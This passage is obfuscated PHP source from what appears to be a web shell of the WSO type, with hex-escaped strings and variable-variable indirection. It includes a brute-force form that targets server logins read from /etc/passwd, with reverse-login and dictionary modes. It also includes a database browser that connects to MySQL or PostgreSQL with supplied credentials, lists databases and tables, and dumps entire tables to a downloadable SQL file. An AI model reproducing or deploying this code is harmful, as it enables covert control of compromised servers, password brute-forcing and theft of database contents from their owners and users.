\x61l\x75\x65=\x6d\x79\x73\x71l>MySq\x6c</o\x70tion><o\x70tion \x76\x61\x6c\x75\x65=pg\x73q\x6c\x3e\x50\x6f\x73\x74\x67r\x65S\x71l</\x6f\x70\x74i\x6fn\x3e\x3c/s\x65l\x65\x63t></\x74d></tr>\x3c\x74\x72\x3e\x3ct\x64\x3e"."<\x69\x6e\x70\x75\x74\x20ty\x70\x65=h\x69dd\x65n n\x61me=c v\x61lue\x3d\x22".htmlspecialchars($GLOBALS["c\x77d"])."\"\x3e"."<i\x6ep\x75t \x74\x79\x70\x65=h\x69dd\x65\x6e\x20n\x61me\x3d\x61\x20v\x61\x6c\x75e\x3d\"".htmlspecialchars($_POST["\x61"])."\"\x3e"."<\x69\x6e\x70\x75t\x20typ\x65\x3dhi\x64de\x6e n\x61\x6d\x65\x3d\x63h\x61\x72\x73e\x74\x20va\x6c\x75e=\"".htmlspecialchars($_POST["c\x68\x61rs\x65t"])."\">"."<span\x3e\x53\x65\x72v\x65\x72:\x70\x6fr\x74\x3c/s\x70an\x3e\x3c/\x74d>"."<t\x64>\x3c\x69\x6ep\x75\x74\x20t\x79\x70e=\x74e\x78\x74\x20n\x61\x6d\x65=s\x65\x72ver va\x6cue\x3d\"12\x37\x2e\x30.\x30\x2e\x31\">\x3c/t\x64\x3e</t\x72\x3e"."\x3c\x74r><t\x64\x3e<s\x70a\x6e>\x42r\x75\x74\x65\x20t\x79\x70\x65</\x73pa\x6e\x3e\x3c/td\x3e"."<\x74d><l\x61bel>\x3c\x69n\x70u\x74\x20t\x79\x70\x65\x3dr\x61d\x69o \x6eame\x3d\x74y\x70e\x20v\x61\x6c\x75\x65\x3d\x22\x31\"\x20ch\x65\x63\x6bed> /etc/pass\x77\x64</label></td\x3e\x3c/\x74\x72\x3e"."<\x74\x72\x3e<td>\x3c/t\x64\x3e\x3c\x74\x64>\x3cla\x62e\x6c \x73ty\x6c\x65=\x22p\x61\x64d\x69ng-le\x66\x74:\x31\x35px\"\x3e\x3c\x69n\x70u\x74 t\x79\x70e=c\x68e\x63\x6b\x62o\x78\x20na\x6d\x65\x3dr\x65\x76e\x72\x73\x65 v\x61\x6c\x75\x65\x3d1\x20c\x68e\x63\x6b\x65\x64> \x72\x65\x76e\x72\x73e (l\x6f\x67i\x6e\x20-> \x6e\x69\x67o\x6c)</\x6c\x61\x62el></\x74\x64></tr\x3e"."\x3c\x74r><\x74d\x3e</td><td>\x3clabe\x6c\x3e\x3c\x69n\x70\x75\x74 \x74y\x70e\x3d\x72a\x64io\x20na\x6de=\x74\x79p\x65\x20v\x61l\x75\x65\x3d\"\x32\x22\x3e \x44icti\x6f\x6e\x61r\x79\x3c/labe\x6c\x3e\x3c/\x74\x64>\x3c/\x74r\x3e"."<\x74r>\x3ct\x64\x3e\x3c/\x74d\x3e<\x74\x64\x3e\x3ctabl\x65\x20\x73\x74\x79l\x65=\"p\x61\x64\x64in\x67-l\x65ft:\x315\x70x\x22\x3e<tr\x3e\x3c\x74d\x3e\x3csp\x61n\x3e\x4co\x67\x69\x6e</\x73p\x61\x6e>\x3c/td>"."\x3ct\x64\x3e\x3ci\x6ep\x75t\x20\x74\x79\x70\x65=t\x65x\x74\x20\x6eame=log\x69n \x76\x61\x6c\x75\x65=\x22r\x6f\x6f\x74\x22\x3e\x3c/td\x3e</t\x72>"."<\x74r>\x3c\x74d\x3e<\x73p\x61\x6e>\x44ic\x74\x69\x6f\x6e\x61ry\x3c/s\x70an></td\x3e"."<\x74\x64>\x3ci\x6eput t\x79pe\x3dtext\x20n\x61\x6de=\x64\x69\x63\x74 \x76\x61l\x75e\x3d\x22".htmlspecialchars($GLOBALS["\x63\x77\x64"])."pass\x77d\x2ed\x69\x63\x22\x3e</\x74d></\x74r></tab\x6ce>"."\x3c/\x74d\x3e</\x74\x72\x3e\x3c\x74r><\x74d>\x3c/t\x64><td><i\x6ep\x75\x74 \x74y\x70\x65\x3d\x73\x75bmit\x20\x76\x61l\x75e\x3d\"\x53\x75\x62m\x69t\x22\x3e</td\x3e</tr\x3e</\x66o\x72\x6d>\x3c/\x74a\x62l\x65\x3e";echo"</\x64iv\x3e<b\x72\x3e";printFooter();}function actionSql(){class DbClass{var$type;var$link;var$res;function DbClass($type){${"\x47L\x4f\x42\x41\x4c\x53"}["\x68d\x6c\x71\x70a\x78"]="\x74y\x70\x65";$this->type=${${"\x47L\x4f\x42\x41\x4c\x53"}["\x68\x64l\x71\x70\x61\x78"]};}function connect($host,$user,$pass,$dbname){${"G\x4cO\x42A\x4cS"}["a\x6etd\x71\x71u\x75e"]="\x75\x73\x65r";switch($this->type){case"m\x79\x73q\x6c":if($this->link=@mysql_connect($host,${${"G\x4c\x4fB\x41\x4c\x53"}["\x61\x6e\x74\x64q\x71u\x75\x65"]},${${"\x47L\x4fB\x41\x4c\x53"}["\x79ly\x67\x6d\x76\x69\x6a\x70\x6fvg"]},true))return true;break;case"\x70\x67sql":$host=explode(":",$host);if(!$host[1])$host[1]=5432;if($this->link=@pg_connect("\x68o\x73t={$host[0]} \x70\x6f\x72t={$host[1]} u\x73\x65r=$user p\x61\x73sword=$pass db\x6eam\x65=$dbname"))return true;break;}return false;}function selectdb($db){$yhybfkulo="\x64\x62";switch($this->type){case"\x6dysq\x6c":if(@mysql_select_db(${$yhybfkulo}))return true;break;}return false;}function query($str){${"\x47\x4c\x4fB\x41\x4cS"}["\x64i\x69\x63x\x71llu"]="\x73\x74\x72";${"\x47\x4c\x4fB\x41\x4c\x53"}["\x6d\x72\x6bl\x6b\x62tf"]="st\x72";switch($this->type){case"my\x73\x71\x6c":return$this->res=@mysql_query(${${"\x47L\x4f\x42A\x4cS"}["\x6d\x72k\x6ck\x62\x74f"]});break;case"pg\x73\x71l":return$this->res=@pg_query($this->link,${${"GL\x4f\x42\x41\x4cS"}["d\x69\x69\x63\x78\x71l\x6c\x75"]});break;}return false;}function fetch(){$ixkruttmhjx="r\x65\x73";${${"\x47\x4cO\x42A\x4cS"}["r\x77\x6d\x77s\x68pkx\x71"]}=func_num_args()?func_get_arg(0):$this->res;switch($this->type){case"\x6dysql":return@mysql_fetch_assoc(${$ixkruttmhjx});break;case"\x70g\x73\x71l":return@pg_fetch_assoc(${${"\x47LO\x42\x41\x4c\x53"}["r\x77\x6dw\x73\x68\x70k\x78\x71"]});break;}return false;}function listDbs(){switch($this->type){case"my\x73q\x6c":return$this->res=@mysql_list_dbs($this->link);break;case"\x70\x67sq\x6c":return$this->res=$this->query("S\x45LECT\x20\x64a\x74n\x61\x6de F\x52\x4f\x4d p\x67\x5fd\x61\x74\x61b\x61\x73\x65");break;}return false;}function listTables(){switch($this->type){case"\x6dysq\x6c":return$this->res=$this->query("\x53\x48\x4fW \x54A\x42L\x45S");break;case"pg\x73\x71\x6c":return$this->res=$this->query("\x73\x65le\x63\x74\x20\x74\x61ble_\x6ea\x6d\x65\x20\x66rom\x20\x69n\x66\x6f\x72mat\x69on_\x73\x63h\x65\x6da\x2e\x74\x61\x62\x6c\x65\x73\x20wh\x65\x72\x65 (\x74\x61\x62l\x65\x5f\x73ch\x65\x6d\x61\x20!\x3d\x20\x27in\x66\x6fr\x6dat\x69on_\x73c\x68\x65m\x61' \x41\x4e\x44 table_sc\x68\x65m\x61\x20!= 'p\x67\x5fca\x74a\x6cog') \x6fr\x20t\x61b\x6c\x65\x5fna\x6d\x65\x20=\x20\x27p\x67_\x75s\x65\x72'");break;}return false;}function error(){switch($this->type){case"\x6d\x79sq\x6c":return@mysql_error($this->link);break;case"p\x67sq\x6c":return@pg_last_error($this->link);break;}return false;}function setCharset($str){$xiwdegforkv="st\x72";switch($this->type){case"\x6d\x79sq\x6c":if(function_exists("\x6d\x79\x73\x71l\x5f\x73\x65\x74_\x63har\x73\x65\x74"))return@mysql_set_charset(${${"\x47\x4cO\x42A\x4cS"}["p\x76xk\x67l\x62\x76\x74\x63\x64"]},$this->link);else$this->query("\x53\x45T\x20CHARS\x45\x54 ".${${"\x47\x4c\x4fBALS"}["\x70\x76\x78\x6b\x67\x6c\x62v\x74\x63\x64"]});break;case"\x6dysq\x6c":return@pg_set_client_encoding($this->link,${$xiwdegforkv});break;}return false;}function dump($table){$esmhosc="\x72\x65\x73";${"\x47\x4c\x4f\x42\x41\x4c\x53"}["zh\x76l\x76\x6fv\x62"]="i\x74\x65m";$pgeqceph="cre\x61te";${"\x47\x4c\x4f\x42\x41\x4c\x53"}["p\x66\x75\x63c\x6d"]="\x74\x61\x62\x6ce";${"\x47L\x4f\x42\x41L\x53"}["\x70be\x6d\x79\x66\x6es"]="t\x61\x62l\x65";$dfyudwxtiie="\x72\x65\x73";switch($this->type){case"my\x73\x71\x6c":${$dfyudwxtiie}=$this->query("SHOW\x20\x43R\x45AT\x45\x20T\x41B\x4cE `".${${"GLOB\x41\x4cS"}["\x70\x62\x65m\x79fn\x73"]}."\x60");${$pgeqceph}=mysql_fetch_array(${$esmhosc});echo${${"\x47\x4c\x4f\x42\x41L\x53"}["\x79\x74\x6cgw\x72\x76jp\x6c"]}[1].";\n\n";$this->query("\x53\x45LEC\x54\x20*\x20\x46\x52\x4f\x4d\x20\x60".${${"GL\x4fB\x41\x4c\x53"}["\x70\x66\x75\x63\x63\x6d"]}."`");while(${${"\x47\x4cO\x42\x41\x4cS"}["\x75f\x69\x68\x73\x70\x73\x67\x71\x64\x78"]}=$this->fetch()){${"GL\x4fBAL\x53"}["\x77\x71\x75\x63e\x76\x77d\x64j"]="\x63\x6f\x6c\x75m\x6e\x73";${"G\x4c\x4f\x42\x41L\x53"}["\x61\x64i\x65k\x79\x75\x68\x74"]="i\x74\x65m";$pvouqvur="c\x6flu\x6d\x6es";${${"\x47LO\x42ALS"}["\x77\x71\x75\x63\x65\x76\x77dd\x6a"]}=array();foreach(${${"\x47\x4c\x4fBAL\x53"}["\x75\x66\x69hs\x70\x73\x67\x71dx"]} as${${"GLO\x42\x41\x4c\x53"}["\x6d\x77\x76\x6b\x67o\x65\x71\x6d\x6f"]}=>${${"\x47\x4c\x4fBA\x4c\x53"}["\x74\x68\x73\x64zp\x66"]}){$klkociwmd="\x6b";$htarppwnjr="\x6b";${"G\x4c\x4fB\x41LS"}["\x65p\x65tn\x74"]="\x69te\x6d";${${"\x47L\x4f\x42\x41\x4c\x53"}["e\x70\x65\x74n\x74"]}[${$klkociwmd}]="\x27".@mysql_real_escape_string(${${"\x47L\x4fB\x41\x4c\x53"}["t\x68\x73\x64\x7a\x70\x66"]})."\x27";${${"GLO\x42\x41\x4c\x53"}["\x79\x79\x74\x75\x75\x67e\x69\x66s"]}[]="\x60".${$htarppwnjr}."\x60";}echo"\x49NSER\x54 \x49NT\x4f\x20`".${${"GLO\x42\x41\x4c\x53"}["hld\x62\x63\x65\x77nl\x62\x6a\x71"]}."` (".implode(", ",${$pvouqvur}).") \x56\x41LU\x45S\x20(".implode(", ",${${"\x47L\x4f\x42\x41\x4c\x53"}["a\x64ie\x6b\x79\x75\x68\x74"]}).")\x3b"."\n";}break;case"\x70g\x73\x71l":$this->query("SEL\x45\x43\x54\x20* F\x52\x4f\x4d\x20".${${"\x47\x4cO\x42\x41\x4cS"}["\x68ld\x62c\x65w\x6e\x6cbjq"]});while(${${"\x47\x4c\x4fB\x41L\x53"}["zh\x76\x6c\x76o\x76\x62"]}=$this->fetch()){${"G\x4c\x4f\x42A\x4cS"}["\x69\x75d\x6b\x6d\x67jg\x75\x66"]="c\x6f\x6c\x75\x6d\x6e\x73";$cmolmjfqatp="\x63\x6f\x6c\x75\x6d\x6es";${"\x47LO\x42\x41\x4c\x53"}["eo\x77\x70\x6aa\x78"]="\x69\x74\x65\x6d";${"\x47L\x4fBA\x4cS"}["\x73\x73\x6dp\x77b\x6a\x6e"]="v";${$cmolmjfqatp}=array();$ufbexddwv="\x74\x61\x62\x6c\x65";$zwhgzjsxd="\x69\x74\x65\x6d";foreach(${${"G\x4c\x4f\x42\x41\x4c\x53"}["e\x6f\x77\x70\x6a\x61x"]} as${${"\x47L\x4fB\x41L\x53"}["\x6d\x77v\x6bgo\x65\x71\x6d\x6f"]}=>${${"\x47\x4c\x4f\x42\x41L\x53"}["\x73\x73\x6dp\x77\x62j\x6e"]}){${"G\x4cOB\x41\x4cS"}["\x74\x67\x64\x75\x63\x75\x76g\x65"]="\x76";${"\x47\x4cOB\x41\x4c\x53"}["\x70u\x71\x77\x74\x62\x76"]="\x6b";${${"\x47\x4cO\x42A\x4c\x53"}["u\x66\x69\x68\x73\x70\x73\x67\x71dx"]}[${${"\x47\x4c\x4f\x42\x41L\x53"}["\x70\x75\x71\x77tb\x76"]}]="'".addslashes(${${"G\x4c\x4f\x42A\x4c\x53"}["t\x67\x64uc\x75\x76\x67\x65"]})."'";${${"\x47L\x4f\x42ALS"}["\x79\x79\x74uug\x65\x69\x66\x73"]}[]=${${"\x47\x4c\x4fBA\x4cS"}["\x6d\x77v\x6bgo\x65\x71\x6d\x6f"]};}echo"\x49NSE\x52\x54 I\x4e\x54\x4f\x20".${$ufbexddwv}." (".implode(", ",${${"\x47\x4c\x4f\x42\x41\x4cS"}["\x69\x75\x64k\x6d\x67\x6a\x67\x75\x66"]}).")\x20\x56ALU\x45\x53\x20(".implode(", ",${$zwhgzjsxd}).")\x3b"."\n";}break;}return false;}}${${"GL\x4fBAL\x53"}["gf\x78\x6c\x77\x6b\x63\x71\x70\x74"]}=new DbClass($_POST["ty\x70\x65"]);if(@$_POST["\x702"]=="\x64\x6f\x77n\x6c\x6f\x61\x64"){ob_start("\x6fb\x5fg\x7ahan\x64\x6c\x65r",4096);$db->connect($_POST["s\x71l_h\x6fst"],$_POST["s\x71l_\x6cogin"],$_POST["sq\x6c_p\x61ss"],$_POST["s\x71l_\x62\x61\x73e"]);$cohoaorubz="\x76";$db->selectdb($_POST["sql_\x62\x61\x73e"]);header("\x43\x6fn\x74\x65nt-D\x69\x73p\x6fsi\x74i\x6f\x6e:\x20\x61t\x74\x61\x63h\x6d\x65n\x74\x3b filenam\x65\x3d\x64\x75\x6d\x70.\x73\x71l");header("\x43\x6f\x6e\x74\x65\x6et-T\x79\x70\x65:\x20t\x65\x78t/\x70\x6cai\x6e");foreach($_POST["t\x62\x6c"]as${${"\x47\x4cOBAL\x53"}["\x74\x68\x73\x64z\x70\x66"]})$db->dump(${$cohoaorubz});exit;}printHeader();echo "\t\x3c\x68\x31>\x53ql\x20b\x72\x6f\x77\x73e\x72\x3c/\x68\x31><d\x69\x76\x20class\x3d\x63o\x6ete\x6e\x74\x3e\n\t\x3c\x66or\x6d\x20\x6eam\x65\x3d\x22\x73\x66\" \x6d\x65\x74\x68od=\"pos\x74\x22>\n\t\t\x3cta\x62\x6ce ce\x6cl\x70\x61\x64\x64\x69ng=\"2\"\x20c\x65ll\x73p\x61\x63ing\x3d\x220\"\x3e\n\t\t\t\x3c\x74\x72>\n\t\t\t\t<\x74\x64\x3eTyp\x65\x3c/\x74\x64\x3e\n\t\t\t\t\x3ct\x64\x3eHo\x73\x74\x3c/\x74\x64>\n\t\t\t\t\x3ct\x64\x3eL\x6fg\x69n</td\x3e\n\t\t\t\t<t\x64\x3e\x50\x61s\x73wo\x72d</\x74\x64>\n\t\t\t\t<\x74d>Da\x74\x61b\x61se\x3c/td>\n\t\t\t\t\x3c\x74\x64\x3e\x3c/\x74\x64>\n\t\t\t</\x74r\x3e\n\t\t\t<t\x72\x3e\n\t\t\t\t\x3cin\x70\x75\x74 \x74yp\x65=hi\x64\x64e\x6e n\x61\x6de\x3d\x61 \x76\x61lu\x65\x3dS\x71\x6c>\n\t\t\t\t<i\x6e\x70\x75t \x74yp\x65\x3d\x68\x69dde\x6e na\x6d\x65=p\x31 val\x75e\x3d'qu\x65\x72y\x27>\n\t\t\t\t\x3c\x69np\x75\x74 \x74ype=\x68\x69\x64\x64e\x6e\x20n\x61\x6de=\x702\x3e\n\t\t\t\t\x3c\x69\x6epu\x74 \x74y\x70e=\x68i\x64d\x65\x6e\x20n\x61\x6de\x3d\x63 \x76alu\x65=\x27";echo htmlspecialchars($GLOBALS["\x63w\x64"]);echo "'\x3e\n\t\t\t\t\x3c\x69\x6e\x70\x75\x74\x20type=\x68id\x64e\x6e\x20\x6ea\x6d\x65=ch\x61\x72\x73\x65\x74 \x76al\x75\x65='";echo isset($_POST["\x63\x68\x61\x72se\x74"])?$_POST["\x63\x68a\x72\x73e\x74"]:"";echo "\x27\x3e\n\t\t\t\t\x3ct\x64>\n\t\t\t\t\t<\x73e\x6c\x65\x63\x74\x20n\x61\x6de=\x27t\x79\x70e\x27\x3e\n\t\t\t\t\t\t<option\x20v\x61lue\x3d\"\x6dys\x71\x6c\" ";if(@$_POST["\x74\x79pe"]=="\x6dy\x73\x71l")echo"sele\x63\x74ed";echo ">\x4dySql\x3c/\x6f\x70ti\x6fn>\n\t\t\t\t\t\t\x3cop\x74\x69on\x20\x76\x61l\x75e=\"\x70\x67sql\"\x20";if(@$_POST["type"]=="\x70\x67s\x71\x6c")echo"\x73\x65\x6c\x65c\x74\x65\x64";echo "\x3e\x50\x6fst\x67\x72\x65Sq\x6c</op\x74\x69\x6f\x6e\x3e\n\t\t\t\t\t</\x73\x65\x6cec\x74\x3e\x3c/\x74\x64>\n\t\t\t\t<\x74d\x3e<\x69nput\x20\x74y\x70\x65\x3d\x74\x65x\x74 \x6e\x61\x6d\x65=sq\x6c\x5f\x68o\x73\x74 va\x6cu\x65\x3d'";echo (empty($_POST["\x73q\x6c\x5f\x68o\x73\x74"])?"\x6c\